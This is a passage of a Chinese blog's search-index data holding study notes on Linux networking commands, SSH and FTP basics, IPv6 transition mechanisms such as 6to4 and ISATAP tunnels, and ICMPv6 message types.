aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>netstat</strong></p><p>用来显示活动的TCP连接、计算机侦听端口、以太网统计信息、IP路由表、IPv4统计信息(IP,ICMP,TCP,UDP)以及IPv6统计信息(TCP,UDP)。</p><ul><li>-a  所有</li><li>-e 以太网的统计信息</li><li>-n 活动的TCP连接，数字形式</li><li>-o 活动的TCP连接</li><li>-p 协议</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -p -tcp //查看tcp协议类型的连接<span class="token function">netstat</span> -p -tcp -udp //仅显示TCP和UDP协议的统计信息<span class="token function">netstat</span> -o <span class="token number">5</span> //每5秒显示一次活动的TCP连接和进程ID<span class="token function">netstat</span> -n Co //以数字形式显示活动的TCP连接和进程ID<span class="token function">netstat</span> -e -s //显示以太网统计信息和所有协议的统计信息<span class="token function">netstat</span> -a //显示处于监听状态的所有端口neystat -ln //显示当前主机监听的所有端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>ftp 访问命令</strong></p><p>用来进行远程文件传输。是标准的文件传输协议的用户接口，是TCP/IP网络计算机之间传输文件的简单有效的方法，允许传输ASCII和二进制文件。</p><p>ftp [-dignv] [主机名称IP地址]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ftp<span class="token operator">></span>命令<span class="token function">ls</span> //列出远程机的当前目录<span class="token builtin class-name">cd</span> //在远程机上改变工作目录lcd //在本地机上改变工作目录close //终止当前的ftp会话<span class="token builtin class-name">hash</span> //每次传输完数据缓冲区中的数据后就显示一个<span class="token comment">#号</span>get <span class="token punctuation">(</span>mget<span class="token punctuation">)</span> //从远程机传送指定文件到本地机put <span class="token punctuation">(</span>mput<span class="token punctuation">)</span> //从本地机传送指定文件到远程机quit //断开与远程机的连接，并退出ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>route 路由设置</p></li></ul><h4 id="P250：SSH服务使用"><a href="#P250：SSH服务使用" class="headerlink" title="P250：SSH服务使用"></a>P250：SSH服务使用</h4><p>SSH远程登录，端口号22</p><p><strong>安装SSH软件包</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps3.jpg" alt="img" style="zoom: 67%;" /> </center>启动服务，使用netstat监听ssh服务状态<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps4.jpg" alt="img" style="zoom:67%;" /> </center>打开命令行输入ssh **用户@ip**进行远程连接<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps5.jpg" alt="img" style="zoom: 50%;" /> </center>#### P255: 信息安全基础<p>例：什么是数字签名，什么是网络攻击，网络传输特性，是否具有保密性，什么是安全性</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/D1D3D1E4122B157885510E5764E3F031.jpg" alt="img" style="zoom: 25%;" /><p>网络攻击：</p><ul><li>中断：正在传输的信息被中止。</li><li>截获：在传输的过程中被其他窃听者获取敏感信息。</li><li>修改：正在传输的信息被其他人修改后再发送给接收方。</li><li>捏造：网络上的其他非法用户以真实用户的名义发送虚假信息。</li></ul><p>网络传输特性：</p><ul><li>Integrity（完整性):实现数据完整地传输给对方，即在传输的过程中不被修改。</li><li>Confidentiality（保密性):保证信息在传输的过程中不被其他人窃听获取。</li><li>Availability（可用性):网络上的服务器可以实时被利用。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212223644220.png" alt="image-20230212223644220" style="zoom:50%;" /><p>加密方式：</p><ul><li><p>对称加密（单钥）</p><ul><li>同一个密钥去加密和解密数据。发送方在发送信息前使用密钥（只有发送方和接收方知道）对数据进行加密，然后传输密文给接收方，接收方使用同样的密钥来解密密文，得到明文信息。</li><li>好处：算法成熟，易于实现；弊端：密钥管理</li><li>DES, 3DES, AES</li></ul></li><li><p>非对称加密（双钥）</p><ul><li>发送方在发送信息前使用接收方的公钥（所有人都知道）进行加密，然后传输密文给接收方，接收方使用自己的私钥（只有接收方自己知道）来解密密文，得到明文信息。</li><li>好处：不进行密钥传输，降低密钥管理风险；弊端：算法实现难度，速度慢</li><li>背包算法，RSA</li></ul><p>一般使用非对称方式加密密钥进行数据传输，使用传递的密钥来加密数据。</p></li></ul><p>数字签名：</p><p>解决问题：发送方否认问题，即发送方否认发送过某一信息；接收方否认问题，即接收方否认接收到某个消息</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212224831381.png" alt="image-20230212224831381" style="zoom: 50%;" /><ul><li><p>消息加密:整个消息的密文作为认证符。</p></li><li><p>消息认证码:MAC消息和密钥的公开函数，产生定长的值作为认证符。</p></li><li><p>Hash 函数:将任意长的消息映射为定长的 hash值的公开函数，以该hash值作为认证符。目前主要使用的数字签名算法有以下几种:</p></li><li><p>RSA算法:是目前应用最广泛的数字签名，Linux 下的 OpenSSH 中即使用这一算法。DSA (Digital Signature Algorithm）算法:基于有限域上的离散对数问题即 DSS（数字签名标准)。</p></li><li><p>GOST 算法:俄罗斯采用的数字签名标准算法。</p></li></ul><h4 id="P266-FTP"><a href="#P266-FTP" class="headerlink" title="P266: FTP"></a>P266: FTP</h4><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps2.jpg" alt="img" style="zoom: 50%;" /> </center>**主要功能：**<ol><li>不同等级的使用者。<ul><li>实体账号 real user</li><li>访客 guest</li><li>匿名登录者 anonymous</li></ul></li><li>命令记录与登录文件记录</li><li>限制或解除使用者所在的根目录。（提高安全性）</li></ol><p><strong>用户分类：</strong></p><ul><li>实体用户(Real user)。系统本机用户。Linux系统一般不会针对实体用户进行限制，因此用户可以针对整个文件系统进行所有的工作。这是非常危险的，为禁止系统使用的账号登录，管理员可以在文件/etc/ftpusrs中设定不允许登录的账号，如root是不允许登录FTP的。</li><li>访客(Guest)。访客用户。只能进行文件传输的用户，即虚拟用户，访问服务器时仍然需要验证。</li><li>匿名者(anonymous)。对于公共性质的服务器可以提供匿名用户访问（一般服务器很少使用)，但应对其进行尽可能多的限制，包括以下一些内容。<ul><li>允许的工作指令要减少很多。</li><li>限制文件传输的数量,尽量不要允许其上传数据。</li><li>设置匿名者同时登录的最大联机数量。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6过渡技术</title>
      <link href="/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a>IPv6过渡技术</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 理解使用隧道机制实现IPv6穿越IPv4的原理</span><span class="token comment"># 掌握6to4自动隧道、ISATAP自动隧道的实现机制</span><span class="token comment"># 掌握Win 7下配置6to4路由器、ISATAP路由器的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>[TOC]</p><h3 id="IPv6过渡技术概述"><a href="#IPv6过渡技术概述" class="headerlink" title="IPv6过渡技术概述"></a>IPv6过渡技术概述</h3><h4 id="IPv6过渡期的特点"><a href="#IPv6过渡期的特点" class="headerlink" title="IPv6过渡期的特点"></a>IPv6过渡期的特点</h4><ul><li>协议的过渡需要在网络中的所有节点上安装和配置新的协议，并且检验所有主机和路由器都能正确运行</li><li>要实施IPv6网络，必须充分考虑现有的网络条件，充分利用现有的条件构造下一代互联网，以避免过多的浪费</li></ul><h4 id="过渡时期采用技术的选择"><a href="#过渡时期采用技术的选择" class="headerlink" title="过渡时期采用技术的选择"></a>过渡时期采用技术的选择</h4><p><strong>双栈技术(Dual Stack)</strong></p><ul><li>让IPv4和IPv6共存于同一设备和网络中(RFC 2893)，采用该技术的节点上同时运行IPv4和IPv6两套协议栈</li><li>对IPv4和IPv6提供了完全的兼容，但对于IP地址耗尽问题没有任何帮助</li></ul><p><strong>隧道技术(Tunnel)</strong></p><ul><li>可以让IPv6业务在现有IPv4基础设施上传输(RFC2473、RFC2893、RFC3056)。将IPv6分组作为无结构的数据，封装在IPv4数据报中，被IPv4网络传输</li><li>隧道分为手工配置的隧道和自动配置的隧道</li><li>它不能解决IPv6节点和IPv4节点之间的相互通信问题</li></ul><p><strong>转换(翻译)技术</strong></p><ul><li>让纯IPv6节点能够和纯IPv4节点相互通信(RFC2766)</li><li>转换网关除了要进行IPv4和IPv6地址转换之外，还要进行协议的转换和翻译。</li></ul><h3 id="兼容的地址"><a href="#兼容的地址" class="headerlink" title="兼容的地址"></a>兼容的地址</h3><ol><li>IPv4兼容地址<ul><li>格式为:0:0:0:0:0:0:w.x.y.z:w或::w.x.y.z，(其中w.x.y.z是公共IPv4地址的点缀十进制表示)，用于IPv6/IPv4节点，它使IPv4/IPv6节点可以通过IPv4网络与IPv6节点进行通信</li><li>如果IPv6通信流的目的地址是IPv4兼容地址，则IPv6通信流会被IPv4报头自动封装，并通过IPv4网络发送到目标节点</li></ul></li><li>IPv4映射地址<ul><li>格式为:0:0:0:0:0:0:FFFF:w.x.y.z或::FFFF:w.x.y.z，用于将一个IPv4-only节点表示为一个IPv6节点，它仅用于内部表示</li><li>IPv4映射地址从不用作IPv6数据包的源地址或目的地址，主要用于一些在IPv4-only节点和IPv6-only节点间进行协议转换的实现方案中</li></ul></li><li>6over4地址</li></ol><ul><li>6over4地址由一个有效的64位单播地址前缀和接口标识符::WWXX:YYZZ组成(其中WWXX:YYZZ是接口的单播IPv41地J止w.X.y.2HJS1 八长示)</li><li>当使用RFC2529中定义的自动隧道机制时，系统会将6over4地址分配给一个连接到支持多播IPv4网络结构中的IPv6节点</li></ul><ol start="4"><li>6to4地址<ul><li>6to4地址基于前缀2002:WWXX:YYZZ::/48(其中WWXX:YYZZ是公共IPv4地址w.x.y.z的冒号十六进制表示)</li><li>当使用RFC3056中定义的自动隧道机制时，6to4地址前缀用于创建站点的全球地址前缀，以及站点中的IPv6节点的全球地址</li></ul></li><li>ISATAP地址<ul><li>ISATAP(Intra-Site Automatic Tunnel Addressing Protocol)地址由一个有效的64位IPv4单播地址前缀和接口标符::5EFE:w.x.y.z所组成(其中w.x.y.z是一个接口的单播IPv4地址)</li><li>当使用RFC5214中定义的自动隧迫礼制时，系统会将使用ISATAP接口标识符的地址分配给IPv6/IPv4节点</li></ul></li></ol><h3 id="双栈技术"><a href="#双栈技术" class="headerlink" title="双栈技术"></a>双栈技术</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>即主机和路由器在同一网络接口上运行IPv4栈和IPv6栈。这样，双栈节点既可以接收和发送IPv4包和IPv6包，因而两个协议可以在同一网络中共存</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6双栈技术示意图.png" style="zoom:67%;" /><h4 id="三种工作模式"><a href="#三种工作模式" class="headerlink" title="三种工作模式"></a>三种工作模式</h4><ul><li>只运行IPv6协议，对外呈现为IPv6节点;</li><li>只运行IPv4协议，对外呈现为IPv4节点;</li><li>同时运行IPv4协议和IPv6协议，对外呈现双栈模式。</li></ul><p>支持三种隧道模式为：不运行隧道；仅运行手工隧道；同时运行手工和自动隧道。</p><h4 id="双栈技术的特点"><a href="#双栈技术的特点" class="headerlink" title="双栈技术的特点"></a>双栈技术的特点</h4><blockquote><p>双栈技术是一切过渡技术的基础，隧道机制和翻译机制都要利用双栈节点</p></blockquote><ul><li>双栈技术应该能独立的配置IPv4和IPv6地址</li></ul><p>双栈技术的优点是互通性好，易于理解；缺点是需要给每个新的运行IPv6协议的网络设备和终端分配IPv4地址，不能解决IPv4地址短缺问题</p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><blockquote><p>隧道(Tunnel)是指将一种协议首部封装在另一种协议首部中，使得一种协议可以通过另一种协议的封装进行通信</p></blockquote><ul><li>优点在于隧道的透明性，不需要大量的IPv6专用设备和链路，可以明显的减少投资</li><li>缺点是配置麻烦，不能实现纯IPv4和纯IPv6主机之间的通信。</li></ul><h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><ul><li>核心思想是通过把IPv6数据报文封装入IPv4数据报文中，让现有IPv4网络成为载体以建立IPv6的通信，隧道两端的节点间数据报文的传送通过IPv4机制进行，隧道被看成一个直接连接的通道</li><li>隧道有两个端点，隧道入口点和隧道出口点。在入口点，路由器将IPv6分组封装在IPv4中，该IPv4的源地址和目的地址分别是入口和出口的IPv4地址。在出口点将IPv6分组取出转发给目的站点</li></ul><h4 id="IPv6数据包的封装步骤"><a href="#IPv6数据包的封装步骤" class="headerlink" title="IPv6数据包的封装步骤"></a>IPv6数据包的封装步骤</h4><ul><li>入口点将IPv6跳数限制减去1，并把该数据包封装进某个IPv4首部中。IPv4首部“协议”域设置为”41”，指示这个分组的净荷是一个IPv6的分组</li><li>通过隧道传输封装后的数据包，如果必要，封装后的IPv4数据包进行分段</li><li>隧道出口点接收到封装后的数据包。如果数据包被分段，出口点进行重组</li><li>出口点剥离IPv4首部，将IPv6数据包传递到目的地址</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据包封装.png" style="zoom:67%;" /><h4 id="隧道的实现方式"><a href="#隧道的实现方式" class="headerlink" title="隧道的实现方式"></a>隧道的实现方式</h4><ul><li><p>为了让数据通过隧道，必须知道两个端点的地址。确定入口点的是直接的因为它出现在IPv4基础结构的边界;确定隧道的出口点要复杂些</p></li><li><p>根据隧道终点地址的获得方式可将隧道分为<strong>配置隧道</strong>和<strong>自动隧道</strong>，其中配置隧道主要用于路由器到路由器</p></li><li><p>自动隧道有以下几种方式:</p><ul><li>Tunnel Brokers(RFC 3053):基于服务器的半自动隧道;</li><li>6to4(RFC 3056):路由器到路由器;</li><li>ISATAP:主机到路由器，路由器到主机，也可以主机到主机;.</li><li>6over4(RFC 2529):主机到路由器，路由器到主机;</li><li>Teredo:通过IPv4 NAT建立隧道;</li></ul></li></ul><h5 id="过渡初期"><a href="#过渡初期" class="headerlink" title="过渡初期"></a>过渡初期</h5><ul><li>使IPv6报文在IPv4网络中传输。手动隧道包括IPv6 over lPv4隧道，自动隧道包括IPv4兼容IPv6自动隧道、6to4隧道和ISATAP隧道</li></ul><h5 id="过渡后期"><a href="#过渡后期" class="headerlink" title="过渡后期"></a>过渡后期</h5><ul><li>使用IPv4 over lPv6隧道，使IPv4报文在lPv6网络中传输。</li></ul><h4 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h4><ul><li>需要隧道两个端点所在网络的管理员协作完成</li><li>隧道的端点地址由配置来决定，不需要为站点分配特殊的IPv6地址</li><li>适用于经常通信的IPv6站点之间</li></ul><h4 id="基本的自动隧道技术"><a href="#基本的自动隧道技术" class="headerlink" title="基本的自动隧道技术"></a>基本的自动隧道技术</h4><ul><li>自动配置的隧道<ul><li>端点地址根据分组的目的地址确定，适用于单独的主机之间或者不经常通信的站点之间。需要站点使用IPv4兼容的IPv6地址(O::IPv4/96)，且站点之间有可用的IPv4连接，每个采用这种机制的主机都需要一个IPv4地址</li><li>不能解决IPv4地址空间耗尽的问题。两个端点都必须支持双协议栈</li></ul></li></ul><h5 id="IPv4多播隧道6-over-4"><a href="#IPv4多播隧道6-over-4" class="headerlink" title="IPv4多播隧道6 over 4"></a>IPv4多播隧道6 over 4</h5><ul><li>与配置隧道不同的是它不需要任何地址配置;与自动隧道不同的是它不要求使用lIPv4兼容的IPv6地址</li><li>当通过支持6 over 4的路由器与外界相连时，站点内的主机可以和外部IPv6站点通信</li></ul><h4 id="6to4隧道"><a href="#6to4隧道" class="headerlink" title="6to4隧道"></a>6to4隧道</h4><blockquote><p>6to4是一种自动隧道机制，通常在站点的边界路由器之间建立隧道，它为IPv6站点和主机之间提供了跨IPv4 Internet的单播IPv6连通性</p></blockquote><p><strong>使用前缀为2002:IPv4addr:/48的6to4地址，其中IPv4addr是站点边界路由器的IPv4地址</strong></p><ul><li>当两个站点中任两台主机通信时，隧道首节点自动从IPv6源地址和目的地址中提取出隧道首尾节点的IPv4地址，在两个站点的边界路由器之间建立一条IPv4隧道</li></ul><p>隧道不需要维护任何信息，通信开始时建立，通信结束时自动撤销</p><h5 id="6to4路由器"><a href="#6to4路由器" class="headerlink" title="6to4路由器"></a>6to4路由器</h5><blockquote><p>6to4路由器是支持使用6to4隧道接口的IPv6/IPv4路由器，它通常用于一个站点中的6to4主机和IPv4网络(如: Internet)上的其它6to4路由器或6to4中继路由器之间转发目标为6to4地址的通信流，充当了隧道的端点</p></blockquote><p>6to4路由器应实现双栈和6to4隧道功能，并且至少有一个全球唯一的可路由IPv4地址需要使用额外的处理逻辑，以正确地封装和拆封，并且还可能需要额外的手工配置</p><h5 id="6to4中继路由器"><a href="#6to4中继路由器" class="headerlink" title="6to4中继路由器"></a>6to4中继路由器</h5><ul><li>在Internet上的6to4路由器和IPv6 Internet上的主机之间转发目标为6to4地址的通信流的IPv6/IPv4路由器</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/6to4中继路由器.png" style="zoom:67%;" /><h4 id="lSATAP隧道"><a href="#lSATAP隧道" class="headerlink" title="lSATAP隧道"></a>lSATAP隧道</h4><blockquote><p>站点内自动隧道寻址协议(Intra-Site Automatic Tunnel AddressingProtocol)，将没有IPv6路由器的IPv4内部网中的IPv6节点连接起来，为IPv6主机之间提供了<strong>跨越IPv4内部网络</strong>单播IPv6连通性</p></blockquote><ul><li>ISATAP主机使用标准地址自动配置机制来创建lSATAP地址。ISATAP地址格式为:64位前缀:5EFE: w.x.y.z。其中前缀可以是链路本地地址前缀、站点本地前缀和全球前缀(包括6to4前缀)</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/ISATAP隧道.png" style="zoom:67%;" /><h3 id="协议转换技术"><a href="#协议转换技术" class="headerlink" title="协议转换技术"></a>协议转换技术</h3><h4 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h4><ul><li>NAT有三种类型:静态NAT;动态NAT;网络地址端口转换NAPT</li><li>对于IPv4向IPv6过渡机制来讲，这里的内网和外网可以分别对应IPv4网络或IPv6网络</li><li>NAT网关使用一个IPv4地址池，并把这些地址和相应IPv6地址绑定在一起。不需要对终端节点做任何修改</li><li>转换技术依据转换所对应计算机网络体系结构的层次。缺点是不支持lPv6高级特性，例如端到端的安全</li></ul><h3 id="过渡机制的选择"><a href="#过渡机制的选择" class="headerlink" title="过渡机制的选择"></a>过渡机制的选择</h3><p>在现有的IPv4网络上逐步融合IPv6技术，过渡的内容包括:</p><blockquote><p>网络的过渡；主机节点的过渡；应用程序的过渡；IPv4网络与IPv6网络之间的互通；IPv6网络之间的互通</p></blockquote><h4 id="lPv6过渡时期建议采用的过渡原则"><a href="#lPv6过渡时期建议采用的过渡原则" class="headerlink" title="lPv6过渡时期建议采用的过渡原则:"></a>lPv6过渡时期建议采用的过渡原则:</h4><ul><li>能直接建立IPv6链路的情况下，使用纯IPv6路由</li><li>不能使用IPv6链路的情况下，IPv6节点间使用隧道技术</li><li>双栈的IPv4/IPv6主机和纯IPv4或纯IPv6网络的主机通信尽量不要采用协议转换，直接自动选择相应的通信协议</li><li>纯IPv6网络和纯IPv4网络主机之间的通信，使用协议转换或应用层网关，所设计的协议转换器或ALG应该尽量保证不修改原有应用</li><li>采用逐步渐进的过渡方式，以保护原有IPv4网络的投资，过渡的技术应尽可能简单，尽量保证IPv4和IPv6之间的互操作性</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICPMv6协议基础</title>
      <link href="/2022/12/16/ICMPv6/"/>
      <url>/2022/12/16/ICMPv6/</url>
      
        <content type="html"><![CDATA[<h2 id="ICMPv6协议"><a href="#ICMPv6协议" class="headerlink" title="ICMPv6协议"></a>ICMPv6协议</h2><p>[TOC]</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握四种差错报文的格式及用途#掌握请求&#x2F;回显报文的格式#理解IPv6的路径MTU发现过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ICMPv6协议概述"><a href="#ICMPv6协议概述" class="headerlink" title="ICMPv6协议概述"></a>ICMPv6协议概述</h3><h4 id="ICMPv6的功能"><a href="#ICMPv6的功能" class="headerlink" title="ICMPv6的功能"></a>ICMPv6的功能</h4><blockquote><p style="color:orange;">IPv6的ICMP(Internet Control Message Protocol)，属于IPv6协议的一个组成部分，IPv6网络中的每一个节点均要实现ICMPv6</p></blockquote><ul><li><p>在IPv6分组<strong>不能被正确处理</strong>时，ICMPv<strong>6向源节点报告分组在传输过程中的出错信息和通告信息</strong>，使网络中的节点可以知道网络中所传输的IPv6分组的情况，以及当前网络状态的重要信息</p></li><li><p><strong>ICMPv6报文作为IPv6分组的数据载荷</strong></p></li></ul><h4 id="lCMPv6与ICMPv4的比较"><a href="#lCMPv6与ICMPv4的比较" class="headerlink" title="lCMPv6与ICMPv4的比较"></a>lCMPv6与ICMPv4的比较</h4><blockquote><p style="color:blue;">ICMPv6与ICMPv4是两个不同的协议，两个版本的ICMP并不兼容</p></blockquote><p>ICMPv6增加的功能包括:</p><ul><li><ul><li>IGMP、ARP、RARP功能被加入到ICMPv6中。</li><li>引入了<strong>邻居发现(Neighbor Discovery)协议</strong>，实现了路由器和前缀发现、地址解析地址自动配置、下一跳地址确定、邻居可达性检测、重复地址检测、重定向等功能</li><li>ICMPv6还支持Mobile lPv6</li></ul></li></ul><h3 id="ICMPv6协议报文格式"><a href="#ICMPv6协议报文格式" class="headerlink" title="ICMPv6协议报文格式"></a>ICMPv6协议报文格式</h3><p>ICMPv6报头由其前一个报头中的下一个报头字段值58来标识。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/ICMPv6报文的一般格式.png" style="zoom:67%;" /><center>ICMPv6报文的一般格式</center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/携带ICMPv6分组的报文格式.png" style="zoom:50%;" /><center>携带ICMPv6分组的报文格式</center>#### 各字段含义<ul><li>类型:8位，标识ICMPv6报文的类型，决定了报文剩余部分的格式</li><li>代码:8位，取决于报文类型，在特定情况下提供更多详细的信息，标识报文类型下一层次的作用</li><li>校验和:16位，对ICMPv6首部和部分IPv6首部中数据的正确性进行检验</li><li>报文主体:对于不同的类型和代码，包含不同的数据。如果是错误报文，则可包含用来帮助故障排除的尽可能多的信息。但<strong>ICMPv6数据包的总大小不能超过IPv6的MTU的最小值1280</strong></li></ul><h3 id="ICMPv6报文类型"><a href="#ICMPv6报文类型" class="headerlink" title="ICMPv6报文类型"></a>ICMPv6报文类型</h3><h4 id="ICMPv6差错报文"><a href="#ICMPv6差错报文" class="headerlink" title="ICMPv6差错报文"></a>ICMPv6差错报文</h4><ul><li>差错报文是由目标节点或中间路由器发送的，用于报告在转发或传送IPv6数据包过程中出现的错误。在所有的ICMPv6差错报文中，8位类型字段中的最高位都为0。因此，类型字段的范围是0~127。</li></ul><h5 id="目的地址失效差错报文"><a href="#目的地址失效差错报文" class="headerlink" title="目的地址失效差错报文"></a>目的地址失效差错报文</h5><blockquote><p style="color:blue;">当数据包无法被转发到目标节点或上层协议时，路由器或目标节点发送ICMPv6目的地址失效差错报文</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/目的地址失效差错报文.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/目的地址失效差错报文代码值.png" style="zoom: 80%;" /><h5 id="包过大差错报文"><a href="#包过大差错报文" class="headerlink" title="包过大差错报文"></a>包过大差错报文</h5><blockquote><p style="color:blue;">数据包无法转发是由于路由器的转发接口的链路MTU小于IPv6数据包的长度，就要发送ICMPv6包过大报文</p></blockquote><ul><li>该ICMPv6错误报文中有一个字段指出导致该问题的链路的MTU值</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/包过大差错报文.png" style="zoom:67%;" /><h5 id="超时报文"><a href="#超时报文" class="headerlink" title="超时报文"></a>超时报文</h5><ul><li>代码为0:当IPv6报头中的跳数限制字段在转发过程中减小为0时，路由器发送ICMPv6超时报文</li><li>代码为1:当目标主机的分片重组定时器超时，目标主机发送，RFC2460规定分片重组时间为60秒</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/报文超时差错报文.png" style="zoom:67%;" /><h5 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h5><blockquote><p>当IPv6报文或扩展报头出现错误，从而导致IPv6不能进行进一步处理时，发送该报文。该报文由路由器或者目标节点发送</p></blockquote><ul><li>代码为0表示遇到错误的报头字段</li><li>代码为1表示遇到无法识别的下一个报头类型</li><li>代码为2表示遇到无法识别的IPv6选项。</li></ul><blockquote><p style="color:blue;">指针字段指出了IPv6数据包中错误发生的位置，其值为从0开始的字节偏移量</p></blockquote><h4 id="ICMPv6信息报文"><a href="#ICMPv6信息报文" class="headerlink" title="ICMPv6信息报文"></a>ICMPv6信息报文</h4><ul><li>信息报文提供诊断功能和附加的主机功能，比如多播侦听发现(MLD）协议和邻居发现协议。在所有的ICMPv6信息报文中，8位类型字段中的最高位都为1。因此，类型字段的范围是128～255。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/ICMPv6信息报文与差错报文.png" style="zoom: 67%;" /><h5 id="回送请求报文"><a href="#回送请求报文" class="headerlink" title="回送请求报文"></a>回送请求报文</h5><ul><li>ICMPv6回送请求报文用于发送至目标节点，以请求目标节点立即发回一个回送应答报文</li><li>发送方主机设置标识符字段和序列号字段，用于将收到的回送应答报文与发送的回送请求报文进行匹配</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/回送请求报文.png" style="zoom:67%;" /><h5 id="回送应答报文"><a href="#回送应答报文" class="headerlink" title="回送应答报文"></a>回送应答报文</h5><ul><li>ICMPv6回送应答报文用于响应接收到的ICMPv6回送请求报文</li><li>回送应答报文的标识符字段，序列号字段和数据字段的值被置为与回送请求报文中的相应字段一样的值</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/回送应答报文.png" style="zoom:67%;" /><h3 id="ICMP处理规则"><a href="#ICMP处理规则" class="headerlink" title="ICMP处理规则"></a>ICMP处理规则</h3><blockquote><p>如果节点收到一条未知类型的ICMPv6错误报文，必须把它传送给上层协议</p></blockquote><blockquote><p>如果节点收到一条未知类型的ICMPv6信息报文，必须将其丢弃</p></blockquote><p>每一个ICMPv6差错报文（类型&lt;128）在不超过最小IPv6 MTU的情况下，包括尽可能大的引起出错的包。</p><p>网络层协议把ICMPv6差错报文传送到上层协议的进程时，原包中的上层协议字段被取出，用来选择合适的上一层进程来处理错误。如果原包含有一个很大的扩展首部，那么有可能上层协议类型并没有包含在ICMPv6差错报文中。原因是为了满足最小IPv6 MTU的限制，原包被切断了。这种情况下，差错报文在任何IPv6层处理后被丢弃。</p><p>如果接收到的数据包为下列情况之一，则不发送ICMPv6差错报文:</p><pre class="line-numbers language-none"><code class="language-none">ICMPv6错误报文，一个ICMPv6重定向报文，一个发往多播地址的，链路层多播包，链路层广播包，一个源地址不能唯一确定某个单独节点的数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对上述情况，存在两个例外，即包过大报文和代码为2，表示不可识别的lPv6选项的参数问题报文。</p><h4 id="路径MTU发现"><a href="#路径MTU发现" class="headerlink" title="路径MTU发现"></a>路径MTU发现</h4><h5 id="lPv6-MTU"><a href="#lPv6-MTU" class="headerlink" title="lPv6 MTU"></a>lPv6 MTU</h5><ul><li>IPv6要求链路层的最小MTU为1280字节，建议MTU长度最小为1500字节</li><li><strong>PMTU:从源到目的节点的所有链路上最小的链路MTU</strong></li><li><strong>PMTU发现的目的是为了确保可以使用某个路径上支持的最大可能的大小来发送数据包</strong></li></ul><h5 id="路径MTU发现工作过程"><a href="#路径MTU发现工作过程" class="headerlink" title="路径MTU发现工作过程"></a>路径MTU发现工作过程</h5><ul><li>首先主机假定PMTU与第一跳链路的MTU相同，并且使用该大小发送数据包</li><li>如果该数据包对于路径中某个路由器过大，路由器丢弃该数据包并返回类型为“数据包过大”的ICMPv6消息，且该消息中包含下一跳链路的MTU大小</li><li>主机使用这个MTU来把后续的包发往同一目的地。主机发送的数据包肯定不会小于IPv6的最小MTU (1280 Bytes)</li><li>重复上述过程，直到数据包到达目的地。</li></ul><h5 id="PMTU的改变"><a href="#PMTU的改变" class="headerlink" 